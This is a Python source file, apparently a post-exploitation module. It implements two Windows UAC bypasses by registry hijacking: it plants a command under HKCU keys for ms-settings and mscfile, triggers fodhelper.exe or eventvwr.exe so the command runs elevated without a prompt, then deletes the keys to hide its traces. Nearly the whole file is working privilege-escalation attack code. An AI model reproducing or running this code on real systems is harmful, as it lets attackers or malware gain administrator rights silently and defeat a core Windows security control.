from _winreg import (
    ConnectRegistry, OpenKey, CreateKey, SetValueEx,
    DeleteKey, CloseKey,
    HKEY_CURRENT_USER, KEY_SET_VALUE, KEY_WRITE,
    REG_SZ
)

import subprocess
import ctypes
import time
import os

def registry_hijacking_fodhelper(cmd, params=""):

    HKCU            = ConnectRegistry(None, HKEY_CURRENT_USER)
    fodhelperPath   = r'Software\Classes\ms-settings\Shell\Open\command'

    if params:
        cmd = '%s %s'.strip() % (cmd, params)

    try:
        # The registry key already exist in HKCU, altering...
        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)
    except:
        # Adding the registry key in HKCU
        CreateKey(HKCU, fodhelperPath)

    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)
    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, "")
    SetValueEx(registry_key, '', 0, REG_SZ, cmd)
    CloseKey(registry_key)

    # Creation fodhelper.exe path
    triggerPath = os.path.join(os.environ['WINDIR'],'System32','fodhelper.exe')
    # Disables file system redirection for the calling thread (File system redirection is enabled by default)
    wow64 = ctypes.c_long(0)
    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))
    # Executing fodhelper.exe
    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
    # Enable file system redirection for the calling thread
    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)

    # Sleeping 5 secds...
    time.sleep(5)

    # Clean everything
    DeleteKey(HKCU, fodhelperPath)


def registry_hijacking_eventvwr(cmd, params=""):
    #   '''
    #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
    #   '''
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    mscCmdPath = r'Software\Classes\mscfile\shell\open\command'

    if params:
        cmd = '%s %s'.strip() % (cmd, params)

    try:
        # The registry key already exist in HKCU, altering...
        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)
    except:
        # Adding the registry key in HKCU
        registry_key = CreateKey(HKCU, mscCmdPath)

    SetValueEx(registry_key, '', 0, REG_SZ, cmd)
    CloseKey(registry_key)

    # Executing eventvwr.exe
    eventvwrPath = os.path.join(os.environ['WINDIR'],'System32','eventvwr.exe')
    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)

    # Sleeping 5 secds...
    time.sleep(5)

    #Clean everything
    DeleteKey(HKCU, mscCmdPath)
